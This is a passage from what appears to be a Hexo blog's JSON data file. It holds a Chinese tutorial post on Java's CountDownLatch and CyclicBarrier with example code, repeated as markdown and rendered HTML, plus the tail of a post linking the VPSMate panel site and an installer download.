class=\"headerlink\" title=\"VPSMate&#x5B98;&#x7F51;\"></a>VPSMate&#x5B98;&#x7F51;</h3><p><a href=\"http://www.vpsmate.org/\">http://www.vpsmate.org/</a></p>\n<h3 id=\"&#x6838;&#x5FC3;&#x5B89;&#x88C5;&#x6587;&#x4EF6;\"><a href=\"#&#x6838;&#x5FC3;&#x5B89;&#x88C5;&#x6587;&#x4EF6;\" class=\"headerlink\" title=\"&#x6838;&#x5FC3;&#x5B89;&#x88C5;&#x6587;&#x4EF6;\"></a>&#x6838;&#x5FC3;&#x5B89;&#x88C5;&#x6587;&#x4EF6;</h3><p>install.py &#x4E0B;&#x8F7D;&#x5730;&#x5740;<br><a href=\"http://pan.baidu.com/s/1eSgFpIU\">http://pan.baidu.com/s/1eSgFpIU</a> &#x5BC6;&#x7801;&#xFF1A;yaju</p>\n"},{"title":"countDownLatch和cyclicBarrier","date":"2016-04-16T15:16:16.000Z","toc":false,"_content":"\n《 Effecit In Java 》说过，从java 1.5发现版本开始, 就不建议使用wait和notify，它们使用比较困难，可以使用更高级并发工具来替代。\n\n![图片1](http://7xvfir.com1.z0.glb.clouddn.com/countDownLatch%E5%92%8CcyclicBarrier/1.png)\n\n图一所说的同步器是指那些能使线程等待另一个线程的对象，常用的有cyclicBarrier和倒计数锁存器CountDownLatch和semaphore。\n\n### CountDownLatch\n一个同步辅助类，在完成一组正在其他线程中执行的操作之前，它允许一个或多个线程一直等待。它的倒计数类似于AutomicInteger的getAndDecrement()。但它还有另一个主要作用类似于 wait和notify。\n<!-- more -->\n**代码示例**：\n```\npackage com.bbk.u001.handle;\n\nimport java.util.concurrent.CountDownLatch;\n\nimport javax.annotation.PostConstruct;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor;\nimport org.springframework.stereotype.Component;\n\n/**\n * CountDownLatch的使用\n * @ClassName: StatsSimilarKnowledgeHandle \n * @Description: TODO\n * @author wasim\n * @create at 2015-8-12 下午8:44:51\n *  \n */\n@Component\npublic class CountDownLatchHandle {\n\t\n\t@Autowired\n\tThreadPoolTaskExecutor executor;\n\t\n\t@PostConstruct\n\tpublic void handleStatsQuestionKnowledge(){\n\t\t\n\t\tCountDownLatch startSignal = new CountDownLatch(12);\n\t\t\n\t\t//导出文件 \n\t\texecutor.execute(new ExportStats(startSignal));\n\t\t\n\t\t//导出文件前，需要先循环下面12个线程\n\t\tfor(int i=0;i<12;i++){\n\t\t\texecutor.execute(new similarKnowledgeHandle(startSignal));\n\t\t}\n\t\t\n\t}\n\t\n\t\n\tpublic class similarKnowledgeHandle implements Runnable{\n\t\tCountDownLatch startSignal;\n\t\t\n\t\tpublic similarKnowledgeHandle(CountDownLatch startSignal) {\n\t\t\tthis.startSignal =startSignal;\n\t\t}\n\t\t\n\t\t@Override\n\t\tpublic void run() {\n\t\t\tstartSignal.countDown();\n\t\t\tSystem.out.println(startSignal.getCount()); //显示当前计数\n\t\t}\n\t}\n\t\n\t\n\tpublic class ExportStats implements Runnable{\n\t\t\n\t\tCountDownLatch startSignal;\n\t\t\n\t\tpublic ExportStats(CountDownLatch startSignal) {\n\t\t\tthis.startSignal =startSignal;\n\t\t}\n\t\t\n\t\t@Override\n\t\tpublic void run() {\n\t\t\ttry {\n\t\t\t\tstartSignal.await(); //当计数为0前，导出文件的线程一直处于等待状态\n\t\t\t\tSystem.out.println(\"start export.......\");\n\t\t\t} catch (InterruptedException e) {\n\t\t\t\te.printStackTrace();\n\t\t\t}\n\t\t}\n\t\t\n\t}\n}\n\n```\n<br/>\n\n### cyclicBarrier \n一个同步辅助类，它允许一组线程互相等待，直到到达某个公共屏障点 (common barrier point)。在涉及一组固定大小的线程的程序中，这些线程必须不时地互相等待，此时 CyclicBarrier 很有用。因为该 barrier 在释放等待线程后可以重用，所以称它为循环 的 barrier。\n\n**代码示例：**\n```\nclass Solver {\n   final int N;\n   final float[][] data;\n   final CyclicBarrier barrier;\n   \n   class Worker implements Runnable {\n     int myRow;\n     Worker(int row) { myRow = row; }\n     public void run() {\n       while (!done()) {\n         processRow(myRow);\n\n         try {\n           barrier.await(); \n         } catch (InterruptedException ex) { \nreturn; \n         } catch (BrokenBarrierException ex) { \nreturn; \n         }\n       }\n     }\n   }\n\n   public Solver(float[][] matrix) {\n     data = matrix;\n     N = matrix.length;\n     barrier = new CyclicBarrier(N, \n                                 new Runnable() {\n                                   public void run() { \n                                     mergeRows(...); \n                                   }\n                                 });\n     for (int i = 0; i < N; ++i) \n       new Thread(new Worker(i)).start();\n\n     waitUntilDone();\n   }\n }\n```\n\n\n### cyclicBarrier 和  CountDownLatch 的区别\n\n![图片2](http://7xvfir.com1.z0.glb.clouddn.com/countDownLatch%E5%92%8CcyclicBarrier/2.png)","source":"_posts/countDownLatch和cyclicBarrier.md","raw":"---\ntitle: countDownLatch和cyclicBarrier\ncategories:\n  - WEB后端\ntags:\n  - concurrent\ndate: 2016-4-16 23:16:16\ntoc: false\n\n---\n\n《 Effecit In Java 》说过，从java 1.5发现版本开始, 就不建议使用wait和notify，它们使用比较困难，可以使用更高级并发工具来替代。\n\n![图片1](http://7xvfir.com1.z0.glb.clouddn.com/countDownLatch%E5%92%8CcyclicBarrier/1.png)\n\n图一所说的同步器是指那些能使线程等待另一个线程的对象，常用的有cyclicBarrier和倒计数锁存器CountDownLatch和semaphore。\n\n### CountDownLatch\n一个同步辅助类，在完成一组正在其他线程中执行的操作之前，它允许一个或多个线程一直等待。它的倒计数类似于AutomicInteger的getAndDecrement()。但它还有另一个主要作用类似于 wait和notify。\n<!-- more -->\n**代码示例**：\n```\npackage com.bbk.u001.handle;\n\nimport java.util.concurrent.CountDownLatch;\n\nimport javax.annotation.PostConstruct;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor;\nimport org.springframework.stereotype.Component;\n\n/**\n * CountDownLatch的使用\n * @ClassName: StatsSimilarKnowledgeHandle \n * @Description: TODO\n * @author wasim\n * @create at 2015-8-12 下午8:44:51\n *  \n */\n@Component\npublic class CountDownLatchHandle {\n\t\n\t@Autowired\n\tThreadPoolTaskExecutor executor;\n\t\n\t@PostConstruct\n\tpublic void handleStatsQuestionKnowledge(){\n\t\t\n\t\tCountDownLatch startSignal = new CountDownLatch(12);\n\t\t\n\t\t//导出文件 \n\t\texecutor.execute(new ExportStats(startSignal));\n\t\t\n\t\t//导出文件前，需要先循环下面12个线程\n\t\tfor(int i=0;i<12;i++){\n\t\t\texecutor.execute(new similarKnowledgeHandle(startSignal));\n\t\t}\n\t\t\n\t}\n\t\n\t\n\tpublic class similarKnowledgeHandle implements Runnable{\n\t\tCountDownLatch startSignal;\n\t\t\n\t\tpublic similarKnowledgeHandle(CountDownLatch startSignal) {\n\t\t\tthis.startSignal =startSignal;\n\t\t}\n\t\t\n\t\t@Override\n\t\tpublic void run() {\n\t\t\tstartSignal.countDown();\n\t\t\tSystem.out.println(startSignal.getCount()); //显示当前计数\n\t\t}\n\t}\n\t\n\t\n\tpublic class ExportStats implements Runnable{\n\t\t\n\t\tCountDownLatch startSignal;\n\t\t\n\t\tpublic ExportStats(CountDownLatch startSignal) {\n\t\t\tthis.startSignal =startSignal;\n\t\t}\n\t\t\n\t\t@Override\n\t\tpublic void run() {\n\t\t\ttry {\n\t\t\t\tstartSignal.await(); //当计数为0前，导出文件的线程一直处于等待状态\n\t\t\t\tSystem.out.println(\"start export.......\");\n\t\t\t} catch (InterruptedException e) {\n\t\t\t\te.printStackTrace();\n\t\t\t}\n\t\t}\n\t\t\n\t}\n}\n\n```\n<br/>\n\n### cyclicBarrier \n一个同步辅助类，它允许一组线程互相等待，直到到达某个公共屏障点 (common barrier point)。在涉及一组固定大小的线程的程序中，这些线程必须不时地互相等待，此时 CyclicBarrier 很有用。因为该 barrier 在释放等待线程后可以重用，所以称它为循环 的 barrier。\n\n**代码示例：**\n```\nclass Solver {\n   final int N;\n   final float[][] data;\n   final CyclicBarrier barrier;\n   \n   class Worker implements Runnable {\n     int myRow;\n     Worker(int row) { myRow = row; }\n     public void run() {\n       while (!done()) {\n         processRow(myRow);\n\n         try {\n           barrier.await(); \n         } catch (InterruptedException ex) { \nreturn; \n         } catch (BrokenBarrierException ex) { \nreturn; \n         }\n       }\n     }\n   }\n\n   public Solver(float[][] matrix) {\n     data = matrix;\n     N = matrix.length;\n     barrier = new CyclicBarrier(N, \n                                 new Runnable() {\n                                   public void run() { \n                                     mergeRows(...); \n                                   }\n                                 });\n     for (int i = 0; i < N; ++i) \n       new Thread(new Worker(i)).start();\n\n     waitUntilDone();\n   }\n }\n```\n\n\n### cyclicBarrier 和  CountDownLatch 的区别\n\n![图片2](http://7xvfir.com1.z0.glb.clouddn.com/countDownLatch%E5%92%8CcyclicBarrier/2.png)","slug":"countDownLatch和cyclicBarrier","published":1,"updated":"2016-11-17T11:59:42.672Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrulck002pgwtmg2ykrv21","content":"<p>&#x300A; Effecit In Java &#x300B;&#x8BF4;&#x8FC7;&#xFF0C;&#x4ECE;java 1.5&#x53D1;&#x73B0;&#x7248;&#x672C;&#x5F00;&#x59CB;, &#x5C31;&#x4E0D;&#x5EFA;&#x8BAE;&#x4F7F;&#x7528;wait&#x548C;notify&#xFF0C;&#x5B83;&#x4EEC;&#x4F7F;&#x7528;&#x6BD4;&#x8F83;&#x56F0;&#x96BE;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x66F4;&#x9AD8;&#x7EA7;&#x5E76;&#x53D1;&#x5DE5;&#x5177;&#x6765;&#x66FF;&#x4EE3;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/countDownLatch%E5%92%8CcyclicBarrier/1.png\" alt=\"&#x56FE;&#x7247;1\"></p>\n<p>&#x56FE;&#x4E00;&#x6240;&#x8BF4;&#x7684;&#x540C;&#x6B65;&#x5668;&#x662F;&#x6307;&#x90A3;&#x4E9B;&#x80FD;&#x4F7F;&#x7EBF;&#x7A0B;&#x7B49;&#x5F85;&#x53E6;&#x4E00;&#x4E2A;&#x7EBF;&#x7A0B;&#x7684;&#x5BF9;&#x8C61;&#xFF0C;&#x5E38;&#x7528;&#x7684;&#x6709;cyclicBarrier&#x548C;&#x5012;&#x8BA1;&#x6570;&#x9501;&#x5B58;&#x5668;CountDownLatch&#x548C;semaphore&#x3002;</p>\n<h3 id=\"CountDownLatch\"><a href=\"#CountDownLatch\" class=\"headerlink\" title=\"CountDownLatch\"></a>CountDownLatch</h3><p>&#x4E00;&#x4E2A;&#x540C;&#x6B65;&#x8F85;&#x52A9;&#x7C7B;&#xFF0C;&#x5728;&#x5B8C;&#x6210;&#x4E00;&#x7EC4;&#x6B63;&#x5728;&#x5176;&#x4ED6;&#x7EBF;&#x7A0B;&#x4E2D;&#x6267;&#x884C;&#x7684;&#x64CD;&#x4F5C;&#x4E4B;&#x524D;&#xFF0C;&#x5B83;&#x5141;&#x8BB8;&#x4E00;&#x4E2A;&#x6216;&#x591A;&#x4E2A;&#x7EBF;&#x7A0B;&#x4E00;&#x76F4;&#x7B49;&#x5F85;&#x3002;&#x5B83;&#x7684;&#x5012;&#x8BA1;&#x6570;&#x7C7B;&#x4F3C;&#x4E8E;AutomicInteger&#x7684;getAndDecrement()&#x3002;&#x4F46;&#x5B83;&#x8FD8;&#x6709;&#x53E6;&#x4E00;&#x4E2A;&#x4E3B;&#x8981;&#x4F5C;&#x7528;&#x7C7B;&#x4F3C;&#x4E8E; wait&#x548C;notify&#x3002;<br><a id=\"more\"></a><br><strong>&#x4EE3;&#x7801;&#x793A;&#x4F8B;</strong>&#xFF1A;<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.bbk.u001.handle;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.util.concurrent.CountDownLatch;</span><br><span class=\"line\"></span><br><span class=\"line\">import javax.annotation.PostConstruct;</span><br><span class=\"line\">import org.springframework.beans.factory.annotation.Autowired;</span><br><span class=\"line\">import org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor;</span><br><span class=\"line\">import org.springframework.stereotype.Component;</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * CountDownLatch&#x7684;&#x4F7F;&#x7528;</span><br><span class=\"line\"> * @ClassName: StatsSimilarKnowledgeHandle </span><br><span class=\"line\"> * @Description: TODO</span><br><span class=\"line\"> * @author wasim</span><br><span class=\"line\"> * @create at 2015-8-12 &#x4E0B;&#x5348;8:44:51</span><br><span class=\"line\"> *  </span><br><span class=\"line\"> */</span><br><span class=\"line\">@Component</span><br><span class=\"line\">public class CountDownLatchHandle {</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t@Autowired</span><br><span class=\"line\">\tThreadPoolTaskExecutor executor;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t@PostConstruct</span><br><span class=\"line\">\tpublic void handleStatsQuestionKnowledge(){</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tCountDownLatch startSignal = new CountDownLatch(12);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t//&#x5BFC;&#x51FA;&#x6587;&#x4EF6; </span><br><span class=\"line\">\t\texecutor.execute(new ExportStats(startSignal));</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t//&#x5BFC;&#x51FA;&#x6587;&#x4EF6;&#x524D;&#xFF0C;&#x9700;&#x8981;&#x5148;&#x5FAA;&#x73AF;&#x4E0B;&#x9762;12&#x4E2A;&#x7EBF;&#x7A0B;</span><br><span class=\"line\">\t\tfor(int i=0;i&lt;12;i++){</span><br><span class=\"line\">\t\t\texecutor.execute(new similarKnowledgeHandle(startSignal));</span><br><span class=\"line\">\t\t}</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t}</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tpublic class similarKnowledgeHandle implements Runnable{</span><br><span class=\"line\">\t\tCountDownLatch startSignal;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tpublic similarKnowledgeHandle(CountDownLatch startSignal) {</span><br><span class=\"line\">\t\t\tthis.startSignal =startSignal;</span><br><span class=\"line\">\t\t}</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t@Override</span><br><span class=\"line\">\t\tpublic void run() {</span><br><span class=\"line\">\t\t\tstartSignal.countDown();</span><br><span class=\"line\">\t\t\tSystem.out.println(startSignal.getCount()); //&#x663E;&#x793A;&#x5F53;&#x524D;&#x8BA1;&#x6570;</span><br><span class=\"line\">\t\t}</span><br><span class=\"line\">\t}</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tpublic class ExportStats implements Runnable{</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tCountDownLatch startSignal;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tpublic ExportStats(CountDownLatch startSignal) {</span><br><span class=\"line\">\t\t\tthis.startSignal =startSignal;</span><br><span class=\"line\">\t\t}</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t@Override</span><br><span class=\"line\">\t\tpublic void run() {</span><br><span class=\"line\">\t\t\ttry {</span><br><span class=\"line\">\t\t\t\tstartSignal.await(); //&#x5F53;&#x8BA1;&#x6570;&#x4E3A;0&#x524D;&#xFF0C;&#x5BFC;&#x51FA;&#x6587;&#x4EF6;&#x7684;&#x7EBF;&#x7A0B;&#x4E00;&#x76F4;&#x5904;&#x4E8E;&#x7B49;&#x5F85;&#x72B6;&#x6001;</span><br><span class=\"line\">\t\t\t\tSystem.out.println(&quot;start export.......&quot;);</span><br><span class=\"line\">\t\t\t} catch (InterruptedException e) {</span><br><span class=\"line\">\t\t\t\te.printStackTrace();</span><br><span class=\"line\">\t\t\t}</span><br><span class=\"line\">\t\t}</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t}</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>\n<p><br></p>\n<h3 id=\"cyclicBarrier\"><a href=\"#cyclicBarrier\" class=\"headerlink\" title=\"cyclicBarrier\"></a>cyclicBarrier</h3><p>&#x4E00;&#x4E2A;&#x540C;&#x6B65;&#x8F85;&#x52A9;&#x7C7B;&#xFF0C;&#x5B83;&#x5141;&#x8BB8;&#x4E00;&#x7EC4;&#x7EBF;&#x7A0B;&#x4E92;&#x76F8;&#x7B49;&#x5F85;&#xFF0C;&#x76F4;&#x5230;&#x5230;&#x8FBE;&#x67D0;&#x4E2A;&#x516C;&#x5171;&#x5C4F;&#x969C;&#x70B9; (common barrier point)&#x3002;&#x5728;&#x6D89;&#x53CA;&#x4E00;&#x7EC4;&#x56FA;&#x5B9A;&#x5927;&#x5C0F;&#x7684;&#x7EBF;&#x7A0B;&#x7684;&#x7A0B;&#x5E8F;&#x4E2D;&#xFF0C;&#x8FD9;&#x4E9B;&#x7EBF;&#x7A0B;&#x5FC5;&#x987B;&#x4E0D;&#x65F6;&#x5730;&#x4E92;&#x76F8;&#x7B49;&#x5F85;&#xFF0C;&#x6B64;&#x65F6; CyclicBarrier &#x5F88;&#x6709;&#x7528;&#x3002;&#x56E0;&#x4E3A;&#x8BE5; barrier &#x5728;&#x91CA;&#x653E;&#x7B49;&#x5F85;&#x7EBF;&#x7A0B;&#x540E;&#x53EF;&#x4EE5;&#x91CD;&#x7528;&#xFF0C;&#x6240;&#x4EE5;&#x79F0;&#x5B83;&#x4E3A;&#x5FAA;&#x73AF; &#x7684; barrier&#x3002;</p>\n<p><strong>&#x4EE3;&#x7801;&#x793A;&#x4F8B;&#xFF1A;</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Solver {</span><br><span class=\"line\">   final int N;</span><br><span class=\"line\">   final float[][] data;</span><br><span class=\"line\">   final CyclicBarrier barrier;</span><br><span class=\"line\">   </span><br><span class=\"line\">   class Worker implements Runnable {</span><br><span class=\"line\">     int myRow;</span><br><span class=\"line\">     Worker(int row) { myRow = row; }</span><br><span class=\"line\">     public void run() {</span><br><span class=\"line\">       while (!done()) {</span><br><span class=\"line\">         processRow(myRow);</span><br><span class=\"line\"></span><br><span class=\"line\">         try {</span><br><span class=\"line\">           barrier.await(); </span><br><span class=\"line\">         } catch (InterruptedException ex) { </span><br><span class=\"line\">return; </span><br><span class=\"line\">         } catch (BrokenBarrierException ex) { </span><br><span class=\"line\">return; </span><br><span class=\"line\">         }</span><br><span class=\"line\">       }</span><br><span class=\"line\">     }</span><br><span class=\"line\">   }</span><br><span class=\"line\"></span><br><span class=\"line\">   public Solver(float[][] matrix) {</span><br><span class=\"line\">     data = matrix;</span><br><span class=\"line\">     N = matrix.length;</span><br><span class=\"line\">     barrier = new CyclicBarrier(N, </span><br><span class=\"line\">                                 new Runnable() {</span><br><span class=\"line\">                                   public void run() { </span><br><span class=\"line\">                                     mergeRows(...); </span><br><span class=\"line\">                                   }</span><br><span class=\"line\">                                 });</span><br><span class=\"line\">     for (int i = 0; i &lt; N; ++i) </span><br><span class=\"line\">       new Thread(new Worker(i)).start();</span><br><span class=\"line\"></span><br><span class=\"line\">     waitUntilDone();</span><br><span class=\"line\">   }</span><br><span class=\"line\"> }</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"cyclicBarrier-&#x548C;-CountDownLatch-&#x7684;&#x533A;&#x522B;\"><a href=\"#cyclicBarrier-&#x548C;-CountDownLatch-&#x7684;&#x533A;&#x522B;\" class=\"headerlink\" title=\"cyclicBarrier &#x548C;  CountDownLatch &#x7684;&#x533A;&#x522B;\"></a>cyclicBarrier &#x548C;  CountDownLatch &#x7684;&#x533A;&#x522B;</h3><p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/countDownLatch%E5%92%8CcyclicBarrier/2.png\" alt=\"&#x56FE;&#x7247;2\"></p>\n","excerpt":"<p>&#x300A; Effecit In Java &#x300B;&#x8BF4;&#x8FC7;&#xFF0C;&#x4ECE;java 1.5&#x53D1;&#x73B0;&#x7248;&#x672C;&#x5F00;&#x59CB;, &#x5C31;&#x4E0D;&#x5EFA;&#x8BAE;&#x4F7F;&#x7528;wait&#x548C;notify&#xFF0C;&#x5B83;&#x4EEC;&#x4F7F;&#x7528;&#x6BD4;&#x8F83;&#x56F0;&#x96BE;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x66F4;&#x9AD8;&#x7EA7;&#x5E76;&#x53D1;&#x5DE5;&#x5177;&#x6765;&#x66FF;&#x4EE3;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/countDownLatch%E5%92%8CcyclicBarrier/1.png\" alt=\"&#x56FE;&#x7247;1\"></p>\n<p>&#x56FE;&#x4E00;&#x6240;&#x8BF4;&#x7684;&#x540C;&#x6B65;&#x5668;&#x662F;&#x6307;&#x90A3;&#x4E9B;&#x80FD;&#x4F7F;&#x7EBF;&#x7A0B;&#x7B49;&#x5F85;&#x53E6;&#x4E00;&#x4E2A;&#x7EBF;&#x7A0B;&#x7684;&#x5BF9;&#x8C61;&#xFF0C;&#x5E38;&#x7528;&#x7684;&#x6709;cyclicBarrier&#x548C;&#x5012;&#x8BA1;&#x6570;&#x9501;&#x5B58;&#x5668;CountDownLatch&#x548C;semaphore&#x3002;</p>\n<h3 id=\"CountDownLatch\"><a href=\"#CountDownLatch\" class=\"headerlink\" title=\"CountDownLatch\"></a>CountDownLatch</h3><p>&#x4E00;&#x4E2A;&#x540C;&#x6B65;&#x8F85;&#x52A9;&#x7C7B;&#xFF0C;&#x5728;&#x5B8C;&#x6210;&#x4E00;&#x7EC4;&#x6B63;&#x5728;&#x5176;&#x4ED6;&#x7EBF;&#x7A0B;&#x4E2D;&#x6267;&#x884C;&#x7684;&#x64CD;&#x4F5C;&#x4E4B;&#x524D;&#xFF0C;&#x5B83;&#x5141;&#x8BB8;&#x4E00;&#x4E2A;&#x6216;&#x591A;&#x4E2A;&#x7EBF;&#x7A0B;&#x4E00;&#x76F4;&#x7B49;&#x5F85;&#x3002;&#x5B83;&#x7684;&#x5012;&#x8BA1;&#x6570;&#x7C7B;&#x4F3C;&#x4E8E;AutomicInteger&#x7684;getAndDecrement()&#x3002;&#x4F46;&#x5B83;&#x8FD8;&#x6709;&#x53E6;&#x4E00;&#x4E2A;&#x4E3B;&#x8981;&#x4F5C;&#x7528;&#x7C7B;&#x4F3C;&#x4E8E; wait&#x548C;notify&#x3002;<br></p>","more":"<br><strong>&#x4EE3;&#x7801;&#x793A;&#x4F8B;</strong>&#xFF1A;<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.bbk.u001.handle;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.util.concurrent.CountDownLatch;</span><br><span class=\"line\"></span><br><span class=\"line\">import javax.annotation.PostConstruct;</span><br><span class=\"line\">import org.springframework.beans.factory.annotation.Autowired;</span><br><span class=\"line\">import org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor;</span><br><span class=\"line\">import org.springframework.stereotype.Component;</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * CountDownLatch&#x7684;&#x4F7F;&#x7528;</span><br><span class=\"line\"> * @ClassName: StatsSimilarKnowledgeHandle </span><br><span class=\"line\"> * @Description: TODO</span><br><span class=\"line\"> * @author wasim</span><br><span class=\"line\"> * @create at 2015-8-12 &#x4E0B;&#x5348;8:44:51</span><br><span class=\"line\"> *  </span><br><span class=\"line\"> */</span><br><span class=\"line\">@Component</span><br><span class=\"line\">public class CountDownLatchHandle {</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t@Autowired</span><br><span class=\"line\">\tThreadPoolTaskExecutor executor;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t@PostConstruct</span><br><span class=\"line\">\tpublic void handleStatsQuestionKnowledge(){</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tCountDownLatch startSignal = new CountDownLatch(12);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t//&#x5BFC;&#x51FA;&#x6587;&#x4EF6; </span><br><span class=\"line\">\t\texecutor.execute(new ExportStats(startSignal));</span><br><span class=\"line\">\t\t</span><br><span 